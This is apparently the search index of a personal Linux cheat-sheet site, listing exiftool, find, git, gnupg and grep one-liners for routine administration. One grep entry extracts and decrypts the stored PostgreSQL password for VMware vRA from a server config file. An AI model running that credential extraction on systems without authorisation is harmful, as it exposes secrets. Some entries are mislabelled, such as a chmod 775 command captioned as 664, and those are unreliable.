-Composite:GPSPosition TestPic.jpg ) echo \"This picture was taken at $gpsPosition \" Timeshift Photos by One Year exiftool \"-AllDates+=1:0:0 0\" . Rename files to datestamp exiftool '-FileName<DateTimeOriginal' -d \"%Y-%m-%d %H.%M.%S%%-c.%%e\" . Display all compoisites exiftool -G -Composite:all Print values by alphanet sorted exiftool -Sort -G -Composite:all$ { PATH } Rename Files to With Milliseconds exiftool -v '-Filename<${datetimeoriginal}${subsectimeoriginal;$_.=0 x(3-length)}.%e' -d %Y%m%d_%H%M%S ${ PATH } Set Date/Time Original date: exiftool '-datetimeoriginal=2015:01:18 12:00:00' ${ PATH } Edit File Modification Date/Time to same date as \"date/time original\" exiftool \"-filemodifydate<datetimeoriginal\" List all dates exiftool -time:all -a -G0:1 -s Update any photo that doesn't have DateTimeOriginal to have it based on file modify date exiftool '-datetimeoriginal<filemodifydate' -if '(not $datetimeoriginal or \\ ($datetimeoriginal eq \"0000:00:00 00:00:00\")) and ($filetype eq \"JPEG\")' ${ PATH } The command alone will put the full filename in the comments. If you want to add the filename without the extension, add the example exiftool config file found here exiftool \"-AllDates=1986:11:05 12:00:00\" -if '$filetype eq \"JPEG\"' ${ PATH } OR find \" ${ PATH } -name \" *.jpg \" | while read filename; do exiftool \" -AllDates = 1986 :11:05 12 :00:00 \" \" ${ FILENAME } \"; done Set File Modification Date/Time exiftool \"-FileModifyDate<XMP:DateTimeOriginal\" \\ \"-FileModifyDate<EXIF:CreateDate\" \\ \"-FileModifyDate<XMP:CreateDate\" \\ \"-FileModifyDate< $IPTC :DateCreated $IPTC :TimeCreated\" \\ \"-FileModifyDate<EXIF:DateTimeOriginal\" ${ FILENAME }","title":"exiftool"},{"location":"linux/exiftool/#exiftool","text":"How i edit, manipulates, injecting and writing and everything yuo can imagine about metadata will be found here with Phil Harvey's exiftool written in perl","title":"exiftool"},{"location":"linux/exiftool/#replace-existing-keyword-list-with-two-new-keywords-exif-and-editor","text":"exiftool -keywords = EXIF -keywords = editor ${ FILENAME } .png","title":"Replace existing keyword list with two new keywords (\"EXIF\" and \"editor\")."},{"location":"linux/exiftool/#copy-a-source-image-to-a-new-file-and-add-a-keyword-word-to-the-current-list-of-keywords","text":"exiftool -Keywords+ = word -o newfile.jpg ${ FILENAME } .png","title":"Copy a source image to a new file, and add a keyword (\"word\") to the current list of keywords."},{"location":"linux/exiftool/#delete-credit-information-from-all-files-in-a--pathectory-where-the-credit-value-was-xxx","text":"exiftool -credit- = xxx ${ PATH }","title":"Delete Credit information from all files in a  ${PATH}ectory where the Credit value was \"xxx\"."},{"location":"linux/exiftool/#write-alternate-language-for-xmpdescription-using-html-character-escaping-to-input-special-characters","text":"exiftool -xmp:description-de = 'k&uuml;hl' -E ${ FILENAME } .png","title":"Write alternate language for XMP:Description, using HTML character escaping to input special characters."},{"location":"linux/exiftool/#delete-all-meta-information-from-an-image","text":"!!! Note: \"You should NOT do this to RAW images (except DNG) since proprietary RAW image formats often contain information in the makernotes that is necessary for converting the image\" exiftool -all = ${ FILENAME } .png","title":"Delete all meta information from an image."},{"location":"linux/exiftool/#delete-all-meta-information-from-an-image-and-add-a-comment-back-in","text":"Note that the order is important: -comment= lonely -all= would also delete the new comment. exiftool -all = -comment = 'lonely' ${ FILENAME } .png","title":"Delete all meta information from an image and add a comment back in."},{"location":"linux/exiftool/#delete-all-meta-information-except-jfif-group-from-an-image","text":"exiftool -all = --jfif:all ${ FILENAME } .png","title":"Delete all meta information except JFIF group from an image."},{"location":"linux/exiftool/#delete-photoshop-meta-information-from-an-image-note-that-the-photoshop-information-also-includes-iptc","text":"exiftool -Photoshop:All = ${ FILENAME } .png","title":"Delete Photoshop meta information from an image (note that the Photoshop information also includes IPTC)."},{"location":"linux/exiftool/#adjust-original-datetime-of-all-images-in-directory--path-by-subtracting-one-hour-and-30-minutes","text":"This is equivalent to \"-DateTimeOriginal-=1.5\". See Image::ExifTool::Shift.pl for details. exiftool -DateTimeOriginal- = '0:0:0 1:30:0' ${ PATH }","title":"Adjust original date/time of all images in directory \" ${PATH}\" by subtracting one hour and 30 minutes."},{"location":"linux/exiftool/#add-3-hours-to-the-createdate-and-modifydate-timestamps-of-two-images","text":"exiftool -createdate+ = 3 -modifydate+ = 3 a.jpg b.jpg","title":"Add 3 hours to the CreateDate and ModifyDate timestamps of two images."},{"location":"linux/exiftool/#shift-the-values-of-datetimeoriginal-createdate-and-modifydate","text":"Forward by 1 hour and 30 minutes for all Canon images in a ${PATH}ectory. (The AllDates tag is provided as a shortcut for these three tags, allowing them to be accessed via a single tag.) exiftool -AllDates+ = 100000 :-30 -if '$make eq \"Canon\"' ${ PATH }","title":"Shift the values of DateTimeOriginal, CreateDate and ModifyDate"},{"location":"linux/exiftool/#set-all-dates-to-2012","text":"exiftool -AllDates = \"2012:03:14 12:25:00\"","title":"Set all dates to 2012"},{"location":"linux/exiftool/#create-xmp-files","text":"exiftool -o %d%f.xmp ${ PATH }","title":"Create xmp files"},{"location":"linux/exiftool/#set-city","text":"exiftool -xmp:city = Kingston i","title":"Set City"},{"location":"linux/exiftool/#print-megapixels","text":"exiftool -Megapixels -if \" $Make eq 'Sony'\"","title":"Print Megapixels"},{"location":"linux/exiftool/#print-gps-info","text":"exiftool -Composite:GPSPosition","title":"Print GPS info"},{"location":"linux/exiftool/#remove--all-gps-info","text":"exiftool -GPS* = -a","title":"Remove  all gps info"},{"location":"linux/exiftool/#remove-all-metadata-run-both","text":"exiftool -ApertureValue = \"3.0\" -EXIF:all = exiftool -EXIF:all = -ApertureValue = \"3.0\"","title":"remove ALL metadata run both"},{"location":"linux/exiftool/#include-some-cool-info","text":"$gpsPosition = $( exiftool -s -s -s -Composite:GPSPosition TestPic.jpg ) echo \"This picture was taken at $gpsPosition \"","title":"Include some cool info"},{"location":"linux/exiftool/#timeshift-photos-by-one-year","text":"exiftool \"-AllDates+=1:0:0 0\" .","title":"Timeshift Photos by One Year"},{"location":"linux/exiftool/#rename-files-to-datestamp","text":"exiftool '-FileName<DateTimeOriginal' -d \"%Y-%m-%d %H.%M.%S%%-c.%%e\" .","title":"Rename files to datestamp"},{"location":"linux/exiftool/#display-all-compoisites","text":"exiftool -G -Composite:all","title":"Display all compoisites"},{"location":"linux/exiftool/#print-values-by-alphanet-sorted","text":"exiftool -Sort -G -Composite:all$ { PATH }","title":"Print values by alphanet sorted"},{"location":"linux/exiftool/#rename-files-to-with-milliseconds","text":"exiftool -v '-Filename<${datetimeoriginal}${subsectimeoriginal;$_.=0 x(3-length)}.%e' -d %Y%m%d_%H%M%S ${ PATH }","title":"Rename Files to With Milliseconds"},{"location":"linux/exiftool/#set-datetime-original-date","text":"exiftool '-datetimeoriginal=2015:01:18 12:00:00' ${ PATH }","title":"Set Date/Time Original date:"},{"location":"linux/exiftool/#edit-file-modification-datetime-to-same-date-as-datetime-original","text":"exiftool \"-filemodifydate<datetimeoriginal\"","title":"Edit File Modification Date/Time to same date as \"date/time original\""},{"location":"linux/exiftool/#list-all-dates","text":"exiftool -time:all -a -G0:1 -s","title":"List all dates"},{"location":"linux/exiftool/#update-any-photo-that-doesnt-have-datetimeoriginal-to-have-it-based-on-file-modify-date","text":"exiftool '-datetimeoriginal<filemodifydate' -if '(not $datetimeoriginal or \\ ($datetimeoriginal eq \"0000:00:00 00:00:00\")) and ($filetype eq \"JPEG\")' ${ PATH }","title":"Update any photo that doesn't have DateTimeOriginal to have it based on file modify date"},{"location":"linux/exiftool/#the-command-alone-will-put-the-full-filename-in-the-comments","text":"If you want to add the filename without the extension, add the example exiftool config file found here exiftool \"-AllDates=1986:11:05 12:00:00\" -if '$filetype eq \"JPEG\"' ${ PATH } OR find \" ${ PATH } -name \" *.jpg \" | while read filename; do exiftool \" -AllDates = 1986 :11:05 12 :00:00 \" \" ${ FILENAME } \"; done","title":"The command alone will put the full filename in the comments."},{"location":"linux/exiftool/#set-file-modification-datetime","text":"exiftool \"-FileModifyDate<XMP:DateTimeOriginal\" \\ \"-FileModifyDate<EXIF:CreateDate\" \\ \"-FileModifyDate<XMP:CreateDate\" \\ \"-FileModifyDate< $IPTC :DateCreated $IPTC :TimeCreated\" \\ \"-FileModifyDate<EXIF:DateTimeOriginal\" ${ FILENAME }","title":"Set File Modification Date/Time"},{"location":"linux/find/","text":"find Search for files in a directory hierarchy Search for files only find -type f Search for folders only find -type d Search for Symlinks ony find -type l Search 3 levels deep find -depth 2 Search for files via regex find -regex PATTERN Exactly 8 512-bit blocks find -size 8 Smaller than 128 bytes find -size -128c Exactly 1440KiB find -size 1440k Larger than 10MiB find -size +10M Larger than 2GiB find -size +2G Search for all files that is larger then 500MB find / -type f -size +500M Search for all Executable files for i in ` find -type f ` ; do [ -x $i ] && echo \" $i is executable\" ; done Search for foo text inside all files in current folder via parallel and use %150 power of our CPU per core find . -type f | ` parallel ` -k -j150% -n 1000 -m grep -H -n <foo> {} Find broken symlinks and delete them find -L /path/to/check -type l -delete Find all the links to a file find -L / -samefile /path/to/file -exec ls -ld {} + Find the most recently changed files (recursively) find . -type f -printf '%TY-%Tm-%Td %TT %p\\n' | sort Remove Fucked Dirnames from Microsoft Windows and Apple ls -li | find . -inum 4063242 -delete Find all gz files and extract them find . -type f -iname \"*.gz\" -print0 -execdir atool -x {} \\; -delete Last accessed between now and 24 hours ago find -atime 0 Accessed more than 24 hours ago find -atime +0 Accessed between 24 and 48 hours ago find -atime 1 Accessed more than 48 hours ago find -atime +1 Accessed less than 24 hours ago (same a 0) find -atime -1 File status changed within the last 6 hours and 30 minutes find -ctime -6h30m Files modified within the last day find /etc -type f -ctime -1 Last modified more than 1 week ago find -mtime +1w Hs exactly these permissions\", i.e. bitwise equality. find /path -perm 777 Change folders permissiosn top 775 find . -type d -exec chmod 775 {} \\; Change files permissiosn top 664 find . -type f -exec chmod 775 {} \\; Find deleleted fles andrestore find /proc/*/fd -ls | grep '(deleted)' Find all 0 byted size files find \" $dir \" -size 0 Find file typ, for example compress for ccompresed filesx find / -type f -exec file {} + Exclude Multiple Directories - Various Options find . -type d \\( -path dir1 -o -path dir2 -o -path dir3 \\) -prune -false -o -name '*.txt' find -name \"*.js\" -not -path \"./directory/*\" ``` bash find / -name MyFile ! -path '*/Directory/*' find . -name '*.js' | grep -v excludeddir find . -name '*.js' -and -not -path directory find /glftpd/site/ -type d -not -path \"*/glftpd/site/databases/*\"","title":"find"},{"location":"linux/find/#find","text":"Search for files in a directory hierarchy","title":"find"},{"location":"linux/find/#search-for-files-only","text":"find -type f","title":"Search for files only"},{"location":"linux/find/#search-for-folders-only","text":"find -type d","title":"Search for folders only"},{"location":"linux/find/#search-for-symlinks-ony","text":"find -type l","title":"Search for Symlinks ony"},{"location":"linux/find/#search-3-levels-deep","text":"find -depth 2","title":"Search 3 levels deep"},{"location":"linux/find/#search-for-files-via-regex","text":"find -regex PATTERN","title":"Search for files via regex"},{"location":"linux/find/#exactly-8-512-bit-blocks","text":"find -size 8","title":"Exactly 8 512-bit blocks"},{"location":"linux/find/#smaller-than-128-bytes","text":"find -size -128c","title":"Smaller than 128 bytes"},{"location":"linux/find/#exactly-1440kib","text":"find -size 1440k","title":"Exactly 1440KiB"},{"location":"linux/find/#larger-than-10mib","text":"find -size +10M","title":"Larger than 10MiB"},{"location":"linux/find/#larger-than-2gib","text":"find -size +2G","title":"Larger than 2GiB"},{"location":"linux/find/#search-for-all-files-that-is-larger-then-500mb","text":"find / -type f -size +500M","title":"Search for all files that is larger then 500MB"},{"location":"linux/find/#search-for-all-executable-files","text":"for i in ` find -type f ` ; do [ -x $i ] && echo \" $i is executable\" ; done","title":"Search for all Executable files"},{"location":"linux/find/#search-for-foo-text-inside-all-files-in-current-folder-via-parallel-and-use-150-power-of-our-cpu-per-core","text":"find . -type f | ` parallel ` -k -j150% -n 1000 -m grep -H -n <foo> {}","title":"Search for foo text inside all files in current folder via parallel and use %150 power of our CPU per core"},{"location":"linux/find/#find-broken-symlinks-and-delete-them","text":"find -L /path/to/check -type l -delete","title":"Find broken symlinks and delete them"},{"location":"linux/find/#find-all-the-links-to-a-file","text":"find -L / -samefile /path/to/file -exec ls -ld {} +","title":"Find all the links to a file"},{"location":"linux/find/#find-the-most-recently-changed-files-recursively","text":"find . -type f -printf '%TY-%Tm-%Td %TT %p\\n' | sort","title":"Find the most recently changed files (recursively)"},{"location":"linux/find/#remove-fucked-dirnames-from-microsoft-windows-and-apple","text":"ls -li | find . -inum 4063242 -delete","title":"Remove Fucked Dirnames from Microsoft Windows and Apple"},{"location":"linux/find/#find-all-gz-files-and-extract-them","text":"find . -type f -iname \"*.gz\" -print0 -execdir atool -x {} \\; -delete","title":"Find all gz files and extract them"},{"location":"linux/find/#last-accessed-between-now-and-24-hours-ago","text":"find -atime 0","title":"Last accessed between now and 24 hours ago"},{"location":"linux/find/#accessed-more-than-24-hours-ago","text":"find -atime +0","title":"Accessed more than 24 hours ago"},{"location":"linux/find/#accessed-between-24-and-48-hours-ago","text":"find -atime 1","title":"Accessed between 24 and 48 hours ago"},{"location":"linux/find/#accessed-more-than-48-hours-ago","text":"find -atime +1","title":"Accessed more than 48 hours ago"},{"location":"linux/find/#accessed-less-than-24-hours-ago-same-a-0","text":"find -atime -1","title":"Accessed less than 24 hours ago (same a 0)"},{"location":"linux/find/#file-status-changed-within-the-last-6-hours-and-30-minutes","text":"find -ctime -6h30m","title":"File status changed within the last 6 hours and 30 minutes"},{"location":"linux/find/#files-modified-within-the-last-day","text":"find /etc -type f -ctime -1","title":"Files modified within the last day"},{"location":"linux/find/#last-modified-more-than-1-week-ago","text":"find -mtime +1w","title":"Last modified more than 1 week ago"},{"location":"linux/find/#hs-exactly-these-permissions-ie-bitwise-equality","text":"find /path -perm 777","title":"Hs exactly these permissions\", i.e. bitwise equality."},{"location":"linux/find/#change-folders-permissiosn-top-775","text":"find . -type d -exec chmod 775 {} \\;","title":"Change folders permissiosn top 775"},{"location":"linux/find/#change-files-permissiosn-top-664","text":"find . -type f -exec chmod 775 {} \\;","title":"Change files permissiosn top 664"},{"location":"linux/find/#find-deleleted-fles-andrestore","text":"find /proc/*/fd -ls | grep '(deleted)'","title":"Find deleleted fles andrestore"},{"location":"linux/find/#find-all-0-byted-size-files","text":"find \" $dir \" -size 0","title":"Find all 0 byted size files"},{"location":"linux/find/#find-file-typ-for-example-compress-for-ccompresed-filesx","text":"find / -type f -exec file {} +","title":"Find file typ, for example compress for ccompresed filesx"},{"location":"linux/find/#exclude-multiple-directories---various-options","text":"find . -type d \\( -path dir1 -o -path dir2 -o -path dir3 \\) -prune -false -o -name '*.txt' find -name \"*.js\" -not -path \"./directory/*\" ``` bash find / -name MyFile ! -path '*/Directory/*' find . -name '*.js' | grep -v excludeddir find . -name '*.js' -and -not -path directory find /glftpd/site/ -type d -not -path \"*/glftpd/site/databases/*\"","title":"Exclude Multiple Directories - Various Options"},{"location":"linux/git/","text":"git CURL = 'curl -sL -H \"Authorization: token $GIT_TOKEN\" ' GIT_TOKEN = \"<token>\" BAK_DIR = $( date + \"%Y-%m-%d\" ) ; Clone all repos from a user for i in ` curl -H \"Authorization: token ${ GIT_TOKEN } \" https://api.github.com/user/repos?per_page = 100 \\ | grep ssh_url \\ | cut -d ':' -f 2 -3 \\ | tr -d '\",' ` ; do echo $i ; done > repos ; while read line ; do git clone $line ; done < repos Print all gistss from a user curl -sL https://api.github.com/gists Clone all gists mkdir $BAK_DIR -gists ; cd $BAK_DIR -gists $CURL | grep -oi \"https.*raw.*\" | cut -d '\"' -f1 | xargs -P5 wget","title":"git"},{"location":"linux/git/#git","text":"CURL = 'curl -sL -H \"Authorization: token $GIT_TOKEN\" ' GIT_TOKEN = \"<token>\" BAK_DIR = $( date + \"%Y-%m-%d\" ) ;","title":"git"},{"location":"linux/git/#clone-all-repos-from-a-user","text":"for i in ` curl -H \"Authorization: token ${ GIT_TOKEN } \" https://api.github.com/user/repos?per_page = 100 \\ | grep ssh_url \\ | cut -d ':' -f 2 -3 \\ | tr -d '\",' ` ; do echo $i ; done > repos ; while read line ; do git clone $line ; done < repos","title":"Clone all repos from a user"},{"location":"linux/git/#print-all-gistss-from-a-user","text":"curl -sL https://api.github.com/gists","title":"Print all gistss from a user"},{"location":"linux/git/#clone-all-gists","text":"mkdir $BAK_DIR -gists ; cd $BAK_DIR -gists $CURL | grep -oi \"https.*raw.*\" | cut -d '\"' -f1 | xargs -P5 wget","title":"Clone all gists"},{"location":"linux/gnupg/","text":"gnupg Add below in .bashrc before you doing anything else export GPG_TTY = $( tty ) Print Version gpg --version Test Clearsign echo \"test\" | gpg --clearsign Print keyID (we need for mutt) gpg --list-keys --with-colons <keyid> | awk -F: '/^pub:/ { print $5 }' Easier way to get keyid gpg --list-signatures Short key behind sub gpg --list-keys --keyid-format SHORT Long key gpg --list-keys --keyid-format LONG Generate a new key gpg --full-generate-key List keys gpg -k List keys ```sh gpg \u2013list-keys ### List the keys in your secret key ring: ```sh gpg --list-secret-keys Export gpg key gpg --output public.pgp --armor --export username@email gpg --output private.pgp --armor --export-secret-key username@email Print private keys gpg --keyid-format 0xlong -K --fingerprint Import keys gpg --import key.gpg gpg --import key.asc This will produce an encrypted file, secret.txt. gpg, that can only be decrypted by the recipient gpg -e -o secret.txt.gpg -r <RECIPIENT> secret.txt Decrypting a file gpg -d -o secret.txt secret.txt.gpg Encrypt file using a shared key. You will be prompted for a passphrase. gpg -c secret.txt Sign a file gpg -o signed-file.txt.gpg -s file.txt Import keys from keyserver gpg --receive-keys <KEY IDS> Upload keys to keyserver gpg --send-keys <KEY IDS> Request updates from keyserver for keys already in your keyring ```sh gpg \u2013refresh-keys ### Search keys from keyserver: ```sh gpg --search-keys \"<SEARCH STRING>\" Override keyserver from ~/.gnupg/ to gpg.conf gpg --keyserver <URL> ... Only merge updates for keys already in key-ring: gpg --import key.asc --merge-options merge-only Trusting a key gpg --edit-key <KEY ID> gpg> sign gpg> save Create a text file with the your messagage, save it to test.txt. Now we want to manual sign it gpg --clearsign test.txt After entering password, we will get a new file named text.txt.asc, its signed, now we also want to verify this gpg --verify test.txt.asc For encrypt our file gpg --encrypt --armor test.txt For decrypt our file gpg --decrypt encrypted.file Send key to key servers gpg --export-options export-minimal --export <KEY IDS> | curl -T - https://keys.openpgp.org Backup Key gpg -o wuseman.gpg --export-options backup --export-secret-keys wuseman@nr1.nu Restore Backup ```sh gpg \u2013import-options restore \u2013import wuseman.gpg ### Get some more info then keyid ```sh gpg --list-packets backups/gnupg/<KEY IDS>.asc Get keyid ```sh gpg \u2013list-packets ~/backups/gnupg/ .asc | awk ' \\(1==\"keyid:\"{print\\) 2}' #### Delete key ```sh gpg --delete-secret-keys <KEY IDS>","title":"gnupg"},{"location":"linux/gnupg/#gnupg","text":"","title":"gnupg"},{"location":"linux/gnupg/#add-below-in-bashrc-before-you-doing-anything-else","text":"export GPG_TTY = $( tty )","title":"Add below in .bashrc before you doing anything else"},{"location":"linux/gnupg/#print-version","text":"gpg --version","title":"Print Version"},{"location":"linux/gnupg/#test-clearsign","text":"echo \"test\" | gpg --clearsign","title":"Test Clearsign"},{"location":"linux/gnupg/#print-keyid-we-need-for-mutt","text":"gpg --list-keys --with-colons <keyid> | awk -F: '/^pub:/ { print $5 }'","title":"Print keyID (we need for mutt)"},{"location":"linux/gnupg/#easier-way-to-get-keyid","text":"gpg --list-signatures","title":"Easier way to get keyid"},{"location":"linux/gnupg/#short-key-behind-sub","text":"gpg --list-keys --keyid-format SHORT","title":"Short key behind sub"},{"location":"linux/gnupg/#long-key","text":"gpg --list-keys --keyid-format LONG","title":"Long key"},{"location":"linux/gnupg/#generate-a-new-key","text":"gpg --full-generate-key","title":"Generate a new key"},{"location":"linux/gnupg/#list-keys","text":"gpg -k","title":"List keys"},{"location":"linux/gnupg/#list-keys_1","text":"```sh gpg \u2013list-keys ### List the keys in your secret key ring: ```sh gpg --list-secret-keys","title":"List keys"},{"location":"linux/gnupg/#export-gpg-key","text":"gpg --output public.pgp --armor --export username@email gpg --output private.pgp --armor --export-secret-key username@email","title":"Export gpg key"},{"location":"linux/gnupg/#print-private-keys","text":"gpg --keyid-format 0xlong -K --fingerprint","title":"Print private keys"},{"location":"linux/gnupg/#import-keys","text":"gpg --import key.gpg gpg --import key.asc","title":"Import keys"},{"location":"linux/gnupg/#this-will-produce-an-encrypted-file-secrettxt--gpg-that-can-only-be-decrypted-by-the-recipient","text":"gpg -e -o secret.txt.gpg -r <RECIPIENT> secret.txt","title":"This will produce an encrypted file, secret.txt.  gpg, that can only be decrypted by the recipient"},{"location":"linux/gnupg/#decrypting-a-file","text":"gpg -d -o secret.txt secret.txt.gpg","title":"Decrypting a file"},{"location":"linux/gnupg/#encrypt-file-using-a-shared-key-you-will-be-prompted-for-a-passphrase","text":"gpg -c secret.txt","title":"Encrypt file using a shared key. You will be prompted for a passphrase."},{"location":"linux/gnupg/#sign-a-file","text":"gpg -o signed-file.txt.gpg -s file.txt","title":"Sign a file"},{"location":"linux/gnupg/#import-keys-from-keyserver","text":"gpg --receive-keys <KEY IDS>","title":"Import keys from keyserver"},{"location":"linux/gnupg/#upload-keys-to-keyserver","text":"gpg --send-keys <KEY IDS>","title":"Upload keys to keyserver"},{"location":"linux/gnupg/#request-updates-from-keyserver-for-keys-already-in-your-keyring","text":"```sh gpg \u2013refresh-keys ### Search keys from keyserver: ```sh gpg --search-keys \"<SEARCH STRING>\"","title":"Request updates from keyserver for keys already in your keyring"},{"location":"linux/gnupg/#override-keyserver-from-gnupg-to--gpgconf","text":"gpg --keyserver <URL> ...","title":"Override keyserver from ~/.gnupg/ to  gpg.conf"},{"location":"linux/gnupg/#only-merge-updates-for-keys-already-in-key-ring","text":"gpg --import key.asc --merge-options merge-only","title":"Only merge updates for keys already in key-ring:"},{"location":"linux/gnupg/#trusting-a-key","text":"gpg --edit-key <KEY ID> gpg> sign gpg> save","title":"Trusting a key"},{"location":"linux/gnupg/#create-a-text-file-with-the-your-messagage-save-it-to-testtxt-now-we-want-to-manual-sign-it","text":"gpg --clearsign test.txt","title":"Create a text file with the your messagage, save it to test.txt. Now we want to manual sign it"},{"location":"linux/gnupg/#after-entering-password-we-will-get-a-new-file-named-texttxtasc-its-signed-now-we-also-want-to-verify-this","text":"gpg --verify test.txt.asc","title":"After entering password, we will get a new file named text.txt.asc, its signed, now we also want to verify this"},{"location":"linux/gnupg/#for-encrypt-our-file","text":"gpg --encrypt --armor test.txt","title":"For encrypt our file"},{"location":"linux/gnupg/#for-decrypt-our-file","text":"gpg --decrypt encrypted.file","title":"For decrypt our file"},{"location":"linux/gnupg/#send-key-to-key-servers","text":"gpg --export-options export-minimal --export <KEY IDS> | curl -T - https://keys.openpgp.org","title":"Send key to key servers"},{"location":"linux/gnupg/#backup-key","text":"gpg -o wuseman.gpg --export-options backup --export-secret-keys wuseman@nr1.nu","title":"Backup Key"},{"location":"linux/gnupg/#restore-backup","text":"```sh gpg \u2013import-options restore \u2013import wuseman.gpg ### Get some more info then keyid ```sh gpg --list-packets backups/gnupg/<KEY IDS>.asc","title":"Restore Backup"},{"location":"linux/gnupg/#get-keyid","text":"```sh gpg \u2013list-packets ~/backups/gnupg/ .asc | awk ' \\(1==\"keyid:\"{print\\) 2}' #### Delete key ```sh gpg --delete-secret-keys <KEY IDS>","title":"Get keyid"},{"location":"linux/grep/","text":"grep I usually using ripgrep for the same thing as grep, mostly commands works fine with ripgrep too Print number of CPU's in a system grep -c '^$' /proc/cpuinfo Grep for 2 (or more) words anywhere on each line of a file grep -E \"(.*)(ERROR)(.*)(FAULT)(.*)\" log.txt Grep directory and sub-directories grep -r <searchterm> . Grep an array item, like a_var[11], in a file grep -n \"arrname\\[[[:digit:]]\\+\\]\" filename Grep directory and sub-directories grep -r <searchterm> . Regex to reliably search a file for valid IP addresses (and external IP addresses) grep -Eoa \"\\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b\" Filetosearch.txt CSV list of infected URLS detected by ClamAV grep \"FOUND\" /var/log/squidclamav.log | awk '{print $5\"-\"$2\"-\"$3\",\"$4\",\"$11}' | sed -e 's/\\,http.*url=/\\,/g' | sed -e 's/&/\\,/g' | sed -e 's/source=//g' |sed -e 's/user=//g' | sed -e 's/virus=//g' | sed -e 's/stream\\:+//g' | sed -e 's/\\+FOUND//g' Edit all files found having a specific string found by grep grep -ir 'foo' * | awk '{print $1}' | sed -e 's/://' | xargs vim Edit all files found having a specific string found by grep grep -ir 'foo' * | awk -F '{print $1}' | xargs vim List fonts used by an SVG file grep 'font-family:[^;]*' <input file.svg> | sed 's/.*font-family:\\([^;]*\\).*/\\1/g' | sort | uniq grep tab (t) grep $'\\t' sample.txt Find which service was used by which port number grep '\\<110/' /etc/services; grep '\\b110/' /etc/services Add ofxAddons mentioned in source files, into addons.make grep -hor ofx[a-zA-Z]*.h src/ | grep -o ofx[^\\.]* >> addons.make finding cr-lf files aka dos files with ^M characters grep -UIlr \"^M\" * Search for specific IPs taken form a text file within the apache access log grep -E \":(`cat bnd-ips.txt | sed 's/\\./\\\\./g' | tr '\\n' '|'`)\" access.log Recursively grep thorugh directory for string in file. grep -r -i \"phrase\" directory/ List your installed Firefox extensions grep -hIr -m 1 :name ~/.mozilla/firefox/*.$USER/extensions | tr '<>=' '\"\"\"' | cut -f3 -d'\"' | sort -u Remove blank lines from a file grep -v \"^$\" file find the device when you only know the mount point grep -w /media/KINGSTON /proc/mounts | cut -d \" \" -f Exclude svn directories with grep grep -r exclude-dir=.svn PATTERN PATH Grep Recursively Through Single File Extension grep include=*.py -lir \"delete\" . find php files even without extension grep -Ilr \"<?php\" . convert chrome html export to folders, links and descriptions grep -E '<DT><A|<DT><H3' bookmarks.html | sed 's/<DT>//' | sed '/Bookmarks bar/d' | sed 's/ ADD_DATE=\\\".*\\\"//g' | sed 's/^[ \\t]*//' | tr '<A HREF' '<a href' Do an OR search using grep to look for more than one search term grep -i '<searchTerm>\\|<someOtherSearchTerm>' <someFileName> Show all TODOs and a few relative lines after it. grep -rnA 10 TODO * Grep for a TAB grep $'\\t' file.txt Count emails in an MBOX file grep -c '^From ' mbox_file prints line numbers grep -n . datafile ; Grep for text within all files in a folder structure grep color -R \"text\" directory/ How To Get the Apache Document Root grep -i '^DocumentRoot' /etc/httpd/conf/httpd.conf | cut -f2 -d'\"' find names of files ending in *log that have both foo and bar grep -l bar *.log | xargs grep -l foo Multiple open files and go directly to the line where some string is grep -rl string_to_find public_html/css/ | xargs -I '{}' vim +/string_to_find {} -c \":s/string_to_find/string_replaced\" change the all files which contains xxxxx to yyyyyy grep -r -l xxxxx . | xargs perl -i -pe \"s/xxxxx/yyyyy/g\" Search for a string in all files recursively grep string * -R Analyse a PHP file for instantations and static calls grep -o \"\\(new \\(\\w\\+\\)\\|\\w\\+::\\)\" file.php | sed 's/new \\|:://' | sort | uniq -c | sort find a word in multiple files avoiding svn grep -r 'keyword keyword2' your/path/ | grep -v svn determine if CPU is 32-bit or 64-bit grep lm /proc/cpuinfo count how many times a string appears in a (source code) tree grep -rc logged_in app/ | cut -d : -f 2 | awk '{sum+=$1} END {print sum}' edit files in current and subdir, remove all lines that containing certain string grep -r \"sampleString\" . |uniq | cut -d: -f1 | xargs sed -i \"/sampleString/d\" Remove today's Debian installed packages grep -e `date +%Y-%m-%d` /var/log/dpkg.log | awk '/install / {print $4}' | uniq | xargs apt-get -y remove List your installed Firefox extensions grep -hIr :name ~/.mozilla/firefox/*.default/extensions | tr '<>=' '\"\"\"' | cut -f3 -d'\"' | sort -u Get the password for PostgreSQL backend db for VMware vRA grep -i s2enc /etc/vcac/server.xml | sed -e 's/.* password=\\\"\\([^\\\"]*\\)\\\".*/\\1/' | xargs -n 1 vcac-config prop-util -d p 2>/dev/null; echo Show a config file without comments grep -Pv '^\\S*(#|$)' Read Nth column (e.g. 2 nd column) of a row of data in a file that has a specific word (e.g. HOME) on that row and extract the last delimited value for the specified delimiter (e.g. /) grep 'HOME.*' data.txt | awk '{print $2}' | awk '{FS=\"/\"}{print $NF}' OR USE ALTERNATE WAY awk '/HOME/ {print $2}' data.txt | awk -F'/' '{print $NF}' remove exact phrase from multiple files grep -r \"mystring\" . |uniq | cut -d: -f1 | xargs sed -i \"s/mystring//\" Execute a command if a file exists grep -sq \"\" /etc/lsb-release && lsb_release -rd find files containing text grep -H -r \"string\" ./* >> grep.txt extract a certain number of lines from a file and dump them to another file grep '' -m X file1 > file2 Find the files that include a TODO statement within a project grep exclude-dir=.svn exclude=*~ -i \"TODO\" -rl . grep 'hoge' * / => Argument list too long grep -r hoge . rgrep: recursive grep without .svn grep query -r . exclude-dir=.svn Find files containing \"text\" grep -lir \"text to find\" * Find out how much data is waiting to be written to disk grep ^Dirty /proc/meminfo Find String grep -iR find_me ./ View only non-comment non-empty lines in a configuration file grep '^[^#]' squid.conf Print the matched line, along with the 3 lines after it. grep -A 3 -i \"example\" demo_text grep binary (hexadecimal) patterns grep -P \"\\x05\\x00\\xc0\" mybinaryfile find the difference in 2 files with grep (diff alternative) grep -vf file1 file2 remove comment '#' in conf files. grep -v ^# file.conf | grep -v ^$ > new_file.conf grep directory and sub-directories grep -r <searchterm> * Remove newlines from output grep . filename Grep syslog today last hour grep -i \"$(date +%b\\ %d\\ %H)\" syslog Grep log between range of minutes grep -i \"$(date +%b\" \"%d )13:4[0-5]\" syslog Colorized grep in less grep color=always | less -R Remove blank lines from a file using grep and save output to new file grep . filename > newfilename Get all possible problems from any log files grep -2 -iIr \"err\\|warn\\|fail\\|crit\" 